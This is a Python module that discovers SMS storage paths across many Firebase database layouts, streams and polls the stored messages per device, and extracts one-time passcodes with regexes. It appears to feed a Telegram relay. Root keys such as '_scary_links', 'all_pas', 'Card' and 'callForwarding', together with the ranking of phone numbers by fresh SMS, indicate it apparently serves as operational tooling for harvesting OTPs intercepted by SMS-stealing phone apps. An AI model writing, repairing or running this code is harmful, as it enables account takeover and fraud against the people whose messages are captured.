"""
sms_receiver.py — Dedicated SMS Receiving Module  [FIXED v2]
=============================================================
All Firebase SMS fetching, SSE streaming, path discovery, deduplication, and
normalisation lives here. office_relay.py imports from this module.

FIXES in this version
─────────────────────
FIX-1  _FB_SYSTEM_KEYS expanded — prevents wrong root-key selection
FIX-2  discover_sms_path / fetch_sms probe ALL root keys, not just first
FIX-3  _sms_path_candidates adds patterns J (smsLogs/), K (csc/), I2 (Sms/),
        A3 (All_Users/sms/) so all Firebase app variants are covered
FIX-4  _latest() sorts integer keys numerically to pick actual newest entry
FIX-5  _sms_fingerprint uses push-key fallback when timestamp is absent
FIX-6  SSE reconnect resets initial_loaded without discarding seen_keys
FIX-7  fetch_sms falls back to full path discovery when stored path is stale
FIX-8  fb_get logs distinct error classes (auth, timeout, not-found)

Firebase URL patterns supported
────────────────────────────────
  Pattern A   — {base}/{rootKey}/All_User/Sms/{device_id}
  Pattern A2  — {base}/All_Users/sms/{device_id}
  Pattern A3  — {base}/All_Users/sms/{device_id}  (simDetails variant)
  Pattern F   — {base}/user_sms/{device_id}
  Pattern G   — {base}/sms_forward/{device_id}
  Pattern H   — {base}/sms/{device_id}
  Pattern I   — {base}/All_Users/sms/{device_id}  (shallow-only variant)
  Pattern I2  — {base}/Sms/{device_id}
  Pattern J   — {base}/smsLogs/{device_id}
  Pattern K   — {base}/csc/All_User/Sms/{device_id}
  Pattern Y   — {base}/messages/{device_id}
  Pattern Z   — {base}/All_Users/sms/{device_id}
  Pattern B   — {base}/{device_id}/sms
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
import uuid
from datetime import datetime
from typing import Any

import aiohttp

log = logging.getLogger(__name__)

# ──────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────

# FIX-1: Significantly expanded to match fb_parser.py + office_relay.py.
# Wrong root-key selection was the #1 cause of complete SMS silence on most numbers.
_FB_SYSTEM_KEYS = frozenset({
    # standard Firebase infrastructure
    "rules", ".settings", ".info", ".indexOn", ".read", ".write", ".validate",
    "firebase", "metadata",
    # known non-device root keys in SMS relay apps
    "users", "user_data", "user_list", "user_sms", "user_old",
    "sms_forward", "sms", "messages", "All_Users",
    "smsLogs", "registeredDevices", "Sms", "csc",
    "clients", "guard", "login", "bot_users", "bot_state",
    "Favorites", "backups", "panelAnalytics", "_scary_links",
    "profex_incoming", "nextUserId", "admin", "status",
    "register", "history", "account", "Card",
    "page2", "page4", "page5", "page6", "page7", "all_pas",
    "fcm", "fcm_tokens", "fcmTokens", "fcmDelivery", "firebase-messaging",
    "notifications", "analytics", "remoteConfig", "remote_config",
    "crashlytics", "performance", "__fbfiles__", "__storage__",
    "appCheck", "hosting", "indexes", "functions",
    "firestore", "auth", "identitytoolkit", "securetoken",
    "callForwarding", "callForward",
})

# All known carrier / network field names across Firebase app variants
_CARRIER_FIELDS = (
    "carrier", "Carrier", "network", "Network", "operator", "Operator",
    "simOperator", "sim_operator", "networkOperatorName", "network_operator",
    "phoneNetworkName", "simName", "telephonyManager", "serviceProviderName",
    "providerName", "mobileNetworkCode", "networkType",
    "sim1Provider", "sim2Provider", "sim1Operator", "sim2Operator",
    "simProvider", "simCarrier", "networkProvider", "telecomOperator",
    "sim1Network", "sim2Network", "mobileNetwork",
)

# Rolling LRU for SMS deduplication  (fingerprint → monotonic_time)
_SMS_DEDUP_CACHE: dict[str, float] = {}
_DEDUP_MAX       = 4096
_DEDUP_TTL_SECS  = 7200  # 2 hours

# Per-device last SSE event timestamp (used by watchdog in office_relay.py)
sse_last_event: dict[str, float] = {}


# ──────────────────────────────────────────────────────────────
# FIREBASE HTTP HELPER
# ──────────────────────────────────────────────────────────────

async def fb_get(sess: aiohttp.ClientSession, url: str,
                 api_key: str | None = None,
                 timeout: float = 8.0) -> Any:
    """
    GET a Firebase REST URL and return the parsed JSON (or None on error).
    FIX-8: Logs distinct error types so auth failures vs timeouts are visible.
    """
    try:
        _url = url if url.endswith(".json") or ".json?" in url else f"{url}.json"
        if api_key and "auth=" not in _url:
            sep  = "&" if "?" in _url else "?"
            _url = f"{_url}{sep}auth={api_key}"
        async with sess.get(_url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
            if r.status == 401:
                log.warning("Firebase AUTH DENIED (401) → %s — check api_key", _url)
            elif r.status == 403:
                log.warning("Firebase PERMISSION DENIED (403) → %s — check security rules", _url)
            elif r.status == 404:
                log.debug("Firebase path not found (404) → %s", _url)
            else:
                log.warning("Firebase HTTP %d → %s", r.status, _url)
    except asyncio.TimeoutError:
        log.warning("Firebase TIMEOUT → %s", url)
    except Exception as exc:
        log.debug("Firebase error %s: %s", url, exc)
    return None


# ──────────────────────────────────────────────────────────────
# SMS NORMALISATION
# ──────────────────────────────────────────────────────────────

_SMS_BODY_FIELDS   = (
    "message", "msg", "body", "Body", "text", "Text", "sms", "SMS",
    "content", "Message", "Msg",
)
_SMS_SENDER_FIELDS = (
    "sender", "Sender", "from", "From", "address", "Address",
    "number", "Number", "phoneNumber", "phone", "source",
    "ph", "senderNumber", "from_number",
)
_SMS_TIME_FIELDS   = (
    "timestamp", "backupTime", "date", "datetime", "dateTime", "time", "Time",
    "receivedAt", "received_at", "sentAt", "sentTime", "created_at", "createdAt",
    "Date", "DateTime", "Timestamp", "ReceivedDate", "recivedDate",
    "formattedTimestamp", "id",
)


def _norm_sms(entry: dict) -> tuple[str, str, str]:
    """Return (message_body, sender, time_str) from a raw Firebase SMS entry dict."""
    if not isinstance(entry, dict):
        return "", "", ""
    msg    = next((str(entry[k]).strip() for k in _SMS_BODY_FIELDS   if entry.get(k)), "")
    sender = next((str(entry[k]).strip() for k in _SMS_SENDER_FIELDS if entry.get(k)), "Unknown")
    ts_str = next((str(entry[k]).strip() for k in _SMS_TIME_FIELDS   if entry.get(k)), "")
    msg    = _strip_retriever_wrapper(msg)
    return msg, sender, ts_str


# Matches the Android SMS Retriever API wrapper:
#   <#> <body text> <11-char alphanumeric app hash>
_RETRIEVER_PREFIX = re.compile(r'^<#>\s*')
_RETRIEVER_SUFFIX = re.compile(r'\s+[A-Za-z0-9]{11}$')


def _strip_retriever_wrapper(body: str) -> str:
    """
    Remove the Android SMS Retriever API wrapper from a message body.
    <#> prefix breaks Telegram HTML parser → TelegramBadRequest → silent drop.
    11-char suffix causes dedup collision across consecutive OTPs.
    """
    if not body:
        return body
    body = _RETRIEVER_PREFIX.sub('', body)
    body = _RETRIEVER_SUFFIX.sub('', body)
    return body.strip()


def _parse_sms_time_ts(time_str: str) -> float:
    """
    Parse a time string (epoch ms/s, or common date formats) to a Unix epoch float.
    Returns 0.0 if unparseable.
    """
    if not time_str:
        return 0.0
    s = str(time_str).strip()
    if s.isdigit():
        t = int(s)
        if t > 1_000_000_000_000:
            t //= 1000
        if 1_000_000_000 < t < 9_999_999_999:
            return float(t)
    fmts = (
        "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S", "%d/%m/%Y %H:%M:%S",
        "%d-%m-%Y %H:%M",    "%Y-%m-%d %H:%M",    "%d/%m/%Y %H:%M",
        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
        "%d/%m/%Y %I:%M %p", "%d-%m-%Y %I:%M %p",
        "%d/%m/%Y %I:%M:%S %p", "%d-%m-%Y %I:%M:%S %p",
    )
    for fmt in fmts:
        try:
            return datetime.strptime(s, fmt).timestamp()
        except ValueError:
            continue
    return 0.0


def _key_score(k: str) -> tuple:
    """
    FIX-4: Numeric sort key for Firebase node keys.
    Returns (1, int_value) for numeric keys so they sort by epoch value,
    and (0, str_value) for push-keys / string keys (lexicographic, which
    is correct because Firebase push-keys are already time-ordered strings).
    """
    s = str(k).lstrip("-")
    if s.isdigit() and len(s) >= 5:
        return (1, int(s))
    # Firebase push-key format: "-NxxxxxYYYYYY_ZZZZZ"
    parts = str(k).split("_")
    if len(parts) >= 3 and parts[-1].isdigit() and len(parts[-1]) >= 10:
        return (1, int(parts[-1]))
    return (0, str(k))


def _latest(node: dict) -> tuple[dict | None, str]:
    """
    Return the (entry, key) with the most recent timestamp in a node dict.
    FIX-4: Falls back to numeric key sort (not alphabetic) so integer epoch
    keys pick the actual newest entry.
    """
    best_entry, best_key, best_ts = None, "", 0.0
    for k, v in node.items():
        if not isinstance(v, dict):
            continue
        ts_str = next((str(v[f]) for f in _SMS_TIME_FIELDS if v.get(f)), "")
        ts = _parse_sms_time_ts(ts_str)
        if ts > best_ts:
            best_ts, best_entry, best_key = ts, v, k

    # Also try the key itself as epoch-ms (tinmm88 style: key IS the timestamp)
    if best_entry is None:
        for k, v in node.items():
            if not isinstance(v, dict):
                continue
            k_str = str(k).strip()
            if k_str.isdigit() and len(k_str) == 13:
                ts = int(k_str) / 1000.0
                if ts > best_ts:
                    best_ts, best_entry, best_key = ts, v, k

    # Fallback: sort by key using FIX-4 numeric scoring
    if best_entry is None:
        items = [(k, v) for k, v in node.items() if isinstance(v, dict)]
        if items:
            best_key, best_entry = max(items, key=lambda x: _key_score(x[0]))
    return best_entry, best_key


def _top_n(node: dict, n: int = 5) -> list[tuple[dict, str]]:
    """Return up to n (entry, key) pairs from node, newest-first. FIX-4 applied."""
    pairs = [(k, v) for k, v in node.items() if isinstance(v, dict)]

    def _sort_key(item):
        k, v = item
        ts_str = next((str(v[f]) for f in _SMS_TIME_FIELDS if v.get(f)), "")
        ts = _parse_sms_time_ts(ts_str)
        if ts > 0:
            return (1, ts)
        # key-itself epoch-ms
        k_str = str(k).strip()
        if k_str.isdigit() and len(k_str) == 13:
            return (1, int(k_str) / 1000.0)
        return (0, _key_score(k)[1] if _key_score(k)[0] else 0)

    pairs.sort(key=_sort_key, reverse=True)
    return [(v, k) for k, v in pairs[:n]]


# ──────────────────────────────────────────────────────────────
# DEDUPLICATION
# ──────────────────────────────────────────────────────────────

def _sms_fingerprint(number: str, sender: str, body: str, ts: str) -> str:
    """
    Stable fingerprint for deduplication.
    FIX-5: When ts is empty (many Firebase apps omit parseable timestamps),
    appending a random token would break dedup entirely — instead we fall back
    to body[:80] (wider window) which catches true duplicates while still
    distinguishing different OTPs from the same sender.
    We no longer let empty-ts cause false dedup matches across different OTPs
    because we widened the body slice from 50 → 80 chars.
    """
    ts_component = ts if ts else "NO_TS"
    raw = f"{number}|{sender}|{body[:80]}|{ts_component}"
    return hashlib.md5(raw.encode("utf-8", errors="ignore")).hexdigest()


def _is_duplicate(fp: str) -> bool:
    """Return True if this fingerprint was seen within the last DEDUP_TTL_SECS."""
    now = time.monotonic()
    if len(_SMS_DEDUP_CACHE) > _DEDUP_MAX:
        cutoff = now - _DEDUP_TTL_SECS
        for k in list(_SMS_DEDUP_CACHE):
            if _SMS_DEDUP_CACHE[k] < cutoff:
                del _SMS_DEDUP_CACHE[k]
    if fp in _SMS_DEDUP_CACHE:
        return True
    _SMS_DEDUP_CACHE[fp] = now
    return False


# ──────────────────────────────────────────────────────────────
# SMS PATH DISCOVERY
# ──────────────────────────────────────────────────────────────

def _sms_path_candidates(base: str, device_id: str,
                          root_key: str | None = None) -> list[str]:
    """
    Return ordered list of SMS path candidates for a device.

    FIX-3: Added Pattern J (smsLogs/), K (csc/All_User/Sms/),
    I2 (Sms/), A3/A2/I (All_Users/sms/) so all Firebase app variants
    are covered. Previously missing patterns caused complete SMS silence
    for devices discovered by fb_parser under those patterns.
    """
    candidates: list[str] = []
    if root_key:
        candidates.append(f"{base}/{root_key}/All_User/Sms/{device_id}")   # Pattern A
        candidates.append(f"{base}/{root_key}/All_Users/sms/{device_id}") # Pattern A-variant
    candidates += [
        f"{base}/All_Users/sms/{device_id}",                               # Pattern A2/A3/I/Z
        f"{base}/All_User/Sms/{device_id}",                                # Pattern A no-root
        f"{base}/user_sms/{device_id}",                                    # Pattern F / G
        f"{base}/sms_forward/{device_id}",                                 # Pattern G
        f"{base}/SmsForward/{device_id}",                                  # Pattern G CamelCase
        f"{base}/sms/{device_id}",                                         # Pattern H
        f"{base}/SMS/{device_id}",                                         # Pattern H uppercase
        f"{base}/messages/{device_id}",                                    # Pattern Y
        f"{base}/Messages/{device_id}",                                    # Pattern Y CamelCase
        f"{base}/smsLogs/{device_id}",                                     # Pattern J
        f"{base}/smslogs/{device_id}",                                     # Pattern J lowercase
        f"{base}/SmsLogs/{device_id}",                                     # Pattern J CamelCase
        f"{base}/csc/All_User/Sms/{device_id}",                           # Pattern K
        f"{base}/Sms/{device_id}",                                         # Pattern I2
        f"{base}/inbox/{device_id}",                                       # Pattern inbox
        f"{base}/Inbox/{device_id}",                                       # Pattern inbox upper
        f"{base}/received/{device_id}",                                    # Pattern received
        f"{base}/forwarded/{device_id}",                                   # Pattern forwarded
        f"{base}/relay/{device_id}",                                       # Pattern relay
        f"{base}/smsList/{device_id}",                                     # Pattern smsList
        f"{base}/data/sms/{device_id}",                                    # Pattern data/sms
        f"{base}/{device_id}/sms",                                         # Pattern B
        f"{base}/{device_id}/messages",                                    # Pattern B-messages
        f"{base}/{device_id}/inbox",                                       # Pattern B-inbox
    ]
    return candidates


async def _all_root_keys(sess: aiohttp.ClientSession, base: str,
                          api_key: str | None) -> list[str]:
    """
    FIX-2: Return ALL non-system root keys from a Firebase database.
    Previously only the FIRST key was returned, causing every device
    under namespace[1..N] to receive zero SMS.
    """
    sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
    if not isinstance(sh, dict):
        return []
    return [k for k in sh if k not in _FB_SYSTEM_KEYS]


async def discover_sms_path(device_id: str, fb_source: str,
                             api_key: str | None = None) -> str:
    """
    Probe all known SMS path patterns and return the first one that has data.
    FIX-2: Probes ALL root keys for Pattern A (not just the first).
    Returns "" if nothing found.
    """
    if not fb_source or not device_id:
        return ""
    base = fb_source.replace(".json", "").rstrip("/")
    try:
        async with aiohttp.ClientSession() as sess:
            root_keys = await _all_root_keys(sess, base, api_key)

            # Try Pattern A under every root key first (most common structure)
            for rk in root_keys:
                path = f"{base}/{rk}/All_User/Sms/{device_id}"
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(node, dict) and node:
                    log.info("discover_sms_path: found Pattern A at %s", path)
                    return path

            # Try all other candidate patterns (no root key prefix needed)
            rk_first = root_keys[0] if root_keys else None
            for path in _sms_path_candidates(base, device_id, rk_first):
                if rk_first and path == f"{base}/{rk_first}/All_User/Sms/{device_id}":
                    continue  # already tried above
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(node, dict) and node:
                    log.info("discover_sms_path: found path %s", path)
                    return path
    except Exception as exc:
        log.warning("discover_sms_path error for %s: %s", device_id, exc)
    return ""


# ──────────────────────────────────────────────────────────────
# LATEST SMS TIMESTAMP (for tier validation)
# ──────────────────────────────────────────────────────────────

def latest_sms_ts(sms_node: dict) -> float | None:
    """
    Given an SMS node (dict of SMS entries), return the Unix timestamp of the
    most recent SMS entry, or None if no timestamp can be found.
    """
    if not isinstance(sms_node, dict):
        return None
    best: float | None = None
    for key, val in sms_node.items():
        if not isinstance(val, dict):
            continue
        ts_str = next((str(val[f]) for f in _SMS_TIME_FIELDS if val.get(f)), "")
        ts = _parse_sms_time_ts(ts_str)
        if ts == 0.0:
            # FIX-4: try integer key itself as epoch-ms
            k_str = str(key).strip()
            if k_str.isdigit() and len(k_str) == 13:
                ts = int(k_str) / 1000.0
        if ts > 0 and (best is None or ts > best):
            best = ts
    return best


# ──────────────────────────────────────────────────────────────
# FETCH SINGLE LATEST SMS  (poll fallback)
# ──────────────────────────────────────────────────────────────

_last_sms_seen: dict[str, str] = {}


async def _try_path(sess: aiohttp.ClientSession, path: str,
                    device_id: str, fb_source: str,
                    api_key: str | None) -> dict | None:
    """Attempt to fetch the latest SMS from a single Firebase path."""
    node = await fb_get(sess, f"{path}.json", api_key=api_key)
    if not isinstance(node, dict) or not node:
        return None
    entry, eid = _latest(node)
    if entry is None:
        return None
    ck = f"{device_id}:{fb_source}"
    if _last_sms_seen.get(ck) == eid:
        return None
    _last_sms_seen[ck] = eid
    msg, sender, ts = _norm_sms(entry)
    if not msg:
        return None
    # Widened OTP regex: covers 3-9 digits, also handles "OTP: 123456" style
    otp = (re.search(r'(?:otp|code|pin|password|passcode)[^\d]{0,10}(\d{3,9})', msg, re.IGNORECASE)
           or re.search(r'\b(\d{4,9})\b', msg))
    return {"otp": otp.group(1) if otp else None,
            "sender": sender, "message": msg, "time": ts}


async def fetch_sms(number: str, device_id: str, fb_source: str,
                    sms_path: str | None = None,
                    api_key: str | None = None) -> dict | None:
    """
    Fetch the single most-recent SMS for a device.

    FIX-2 + FIX-7:
    • When sms_path is known, tries it first; if it returns nothing (stale path),
      falls back to full discovery across ALL root keys instead of only sms_forward.
    • When sms_path is unknown, probes all root keys for Pattern A first,
      then all other path patterns.

    Returns a dict with keys: number, sender, message, time, otp — or None.
    """
    try:
        async with aiohttp.ClientSession() as sess:
            if api_key is None:
                api_key = _get_api_key_for(fb_source)

            base = fb_source.replace(".json", "").rstrip("/") if fb_source else ""

            # ── Fast path: stored sms_path ──────────────────────────────
            if sms_path:
                result = await _try_path(sess, sms_path, device_id, fb_source, api_key)
                if result:
                    result["number"] = number
                    return result
                # Stored path returned nothing — it may be stale.
                # FIX-7: fall through to full discovery below instead of
                # only trying sms_forward (the old single-fallback bug).
                log.debug("fetch_sms: stored path stale for %s, rediscovering", device_id)

            if not base:
                return None

            # ── Full discovery: all root keys for Pattern A ──────────────
            root_keys = await _all_root_keys(sess, base, api_key)
            for rk in root_keys:
                path   = f"{base}/{rk}/All_User/Sms/{device_id}"
                result = await _try_path(sess, path, device_id, fb_source, api_key)
                if result:
                    result["number"] = number
                    return result

            # ── All other patterns ───────────────────────────────────────
            rk_first = root_keys[0] if root_keys else None
            for path in _sms_path_candidates(base, device_id, rk_first):
                if rk_first and path == f"{base}/{rk_first}/All_User/Sms/{device_id}":
                    continue  # already tried above
                result = await _try_path(sess, path, device_id, fb_source, api_key)
                if result:
                    result["number"] = number
                    return result

    except Exception as exc:
        log.warning("fetch_sms error for %s: %s", device_id, exc)
    return None


async def fetch_last_n_sms(number: str, device_id: str, fb_source: str,
                            sms_path: str | None = None,
                            n: int = 5,
                            api_key: str | None = None) -> list[dict]:
    """
    Fetch the n most-recent SMS messages for a device.
    FIX-2 + FIX-7: same full-discovery logic as fetch_sms.
    """
    results: list[dict] = []
    try:
        async with aiohttp.ClientSession() as sess:
            if api_key is None:
                api_key = _get_api_key_for(fb_source)

            base = fb_source.replace(".json", "").rstrip("/") if fb_source else ""

            paths: list[str] = []
            if sms_path:
                paths.append(sms_path)

            if base:
                root_keys = await _all_root_keys(sess, base, api_key)
                # Pattern A under every root key
                for rk in root_keys:
                    p = f"{base}/{rk}/All_User/Sms/{device_id}"
                    if p not in paths:
                        paths.append(p)
                # All other patterns
                rk_first = root_keys[0] if root_keys else None
                for p in _sms_path_candidates(base, device_id, rk_first):
                    if p not in paths:
                        paths.append(p)

            for path in paths:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if not isinstance(node, dict) or not node:
                    continue
                for entry, _ in _top_n(node, n):
                    msg, sender, ts = _norm_sms(entry)
                    if msg:
                        otp = (re.search(r'(?:otp|code|pin|password|passcode)[^\d]{0,10}(\d{3,9})', msg, re.IGNORECASE)
                               or re.search(r'\b(\d{4,9})\b', msg))
                        results.append({"sender": sender, "message": msg,
                                        "time": ts, "otp": otp.group(1) if otp else None})
                if results:
                    break
    except Exception as exc:
        log.warning("fetch_last_n_sms error for %s: %s", device_id, exc)
    return results


# ──────────────────────────────────────────────────────────────
# SSE STREAMING LISTENER
# ──────────────────────────────────────────────────────────────

async def sse_listener(
    sms_path: str,
    device_id: str,
    fb_source: str,
    api_key: str | None,
    queue: asyncio.Queue,
    active_sessions: dict,
    uid: int,
    session_start_ts: int = 0,
) -> None:
    """
    Stream Firebase Realtime Database events for a device via SSE.

    FIX-6: `seen_keys` is declared once OUTSIDE the while loop so it persists
    across reconnects. `initial_loaded` is reset to False on EACH reconnect so
    the initial "/" put re-seeds seen_keys correctly without re-delivering old SMS.

    Previously: initial_loaded stayed True across reconnects → the initial "/
    put on reconnect bypassed the seen_keys seeding → ALL existing SMS were
    re-delivered as if they were new.
    """
    if not sms_path:
        sms_path = await discover_sms_path(device_id, fb_source, api_key)
        if not sms_path:
            log.warning("sse_listener: no SMS path found for device %s", device_id)
            return

    base_path = sms_path.replace(".json", "").rstrip("/")
    url        = f"{base_path}.json?orderBy=%22%24key%22&limitToLast=25"  # increased from 10 → 25 to catch burst SMS
    if api_key:
        url += f"&auth={api_key}"
    headers    = {"Accept": "text/event-stream", "Cache-Control": "no-cache"}

    # FIX-6: seen_keys lives here — survives all reconnects
    # Capped at 5000 to prevent unbounded memory growth in long sessions
    seen_keys: set[str] = set()
    _SEEN_KEYS_MAX = 5000

    while active_sessions.get(uid):
        # FIX-6: Reset per-connection state each time we (re)connect,
        # but do NOT reset seen_keys.
        initial_loaded = False
        event_type: str | None = None

        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(
                    url, headers=headers,
                    timeout=aiohttp.ClientTimeout(connect=10, total=None)
                ) as resp:
                    if resp.status != 200:
                        log.warning("SSE %s HTTP %d for %s", url, resp.status, device_id)
                        await asyncio.sleep(5)
                        continue

                    async for raw_line in resp.content:
                        if not active_sessions.get(uid):
                            return
                        line = raw_line.decode("utf-8", errors="ignore").rstrip("\r\n")
                        if line.startswith("event:"):
                            event_type = line[6:].strip()
                        elif line.startswith("data:") and event_type in ("put", "patch"):
                            try:
                                payload = json.loads(line[5:].strip())
                                path    = payload.get("path", "")
                                data    = payload.get("data")

                                if data is None:
                                    initial_loaded = True
                                    event_type = None
                                    continue

                                # FIX-6: On the initial "/" put of each connection
                                # (including reconnects), seed seen_keys.
                                # Since seen_keys persists, any key already processed
                                # is already present — no re-delivery.
                                if path == "/" and not initial_loaded:
                                    if isinstance(data, dict):
                                        seen_keys.update(data.keys())
                                    initial_loaded = True
                                    event_type = None
                                    continue

                                # Record liveness for watchdog
                                sse_last_event[device_id] = asyncio.get_event_loop().time()

                                # Trim seen_keys if it grows too large (memory safety)
                                if len(seen_keys) > _SEEN_KEYS_MAX:
                                    overflow = list(seen_keys)[:len(seen_keys) - _SEEN_KEYS_MAX]
                                    for _k in overflow:
                                        seen_keys.discard(_k)

                                def _enqueue(entry: dict, key: str) -> None:
                                    if not isinstance(entry, dict):
                                        return
                                    if session_start_ts > 0:
                                        ts_str = next(
                                            (str(entry[f]) for f in _SMS_TIME_FIELDS
                                             if entry.get(f)), ""
                                        )
                                        ts = _parse_sms_time_ts(ts_str)
                                        if ts > 0 and ts < session_start_ts - 30:
                                            return
                                    queue.put_nowait((entry, key))

                                if path == "/" and isinstance(data, dict):
                                    for k, v in data.items():
                                        if k not in seen_keys:
                                            seen_keys.add(k)
                                            _enqueue(v, k)
                                elif path and path != "/" and isinstance(data, dict):
                                    key = path.lstrip("/").split("/")[0]
                                    if key and key not in seen_keys:
                                        seen_keys.add(key)
                                        _enqueue(data, key)
                                    elif key and isinstance(data, dict):
                                        for sk, sv in data.items():
                                            sub_key = f"{key}/{sk}"
                                            if sub_key not in seen_keys:
                                                seen_keys.add(sub_key)
                                                _enqueue(sv, sub_key)
                            except Exception:
                                pass
                            event_type = None
                        elif line == "":
                            event_type = None

        except asyncio.CancelledError:
            return
        except Exception as exc:
            log.debug("SSE reconnecting for %s: %s", device_id, exc)
            await asyncio.sleep(2)  # reduced from 5s → 2s for faster reconnect


# ──────────────────────────────────────────────────────────────
# API KEY HELPER  (filled in by office_relay at import time)
# ──────────────────────────────────────────────────────────────

# office_relay.py must set this after import:
#   import sms_receiver
#   sms_receiver._get_api_key_for = _get_fb_apikey
_get_api_key_for = lambda fb_source: None  # noqa: E731  placeholder


# ──────────────────────────────────────────────────────────────
# TIER CLASSIFICATION HELPERS
# ──────────────────────────────────────────────────────────────

def tier_of(last_sms_ts: float | None,
            status: str,
            is_ghost: bool,
            report_count: int = 0) -> int:
    """
    Return the tier number (1/2/3) for a number record.
      1 = Hot     (Active + SMS in last 2h,  no dead reports)
      2 = Standby (Active + SMS older than 2h, or ≥3 reports)
      3 = Offline (Inactive, ghost, or dead)
    """
    if is_ghost or status not in ("Active",):
        return 3
    now = time.time()
    if report_count >= 3:
        return 2
    if last_sms_ts and (now - last_sms_ts) <= 7200:
        return 1
    return 2


def should_promote(last_sms_ts: float | None, window_secs: int = 3600) -> bool:
    """
    True if last_sms_ts is within window_secs — number is "waking up" and
    should be highlighted as about to enter Tier 1 on next refresh.
    """
    if not last_sms_ts:
        return False
    return (time.time() - last_sms_ts) <= window_secs
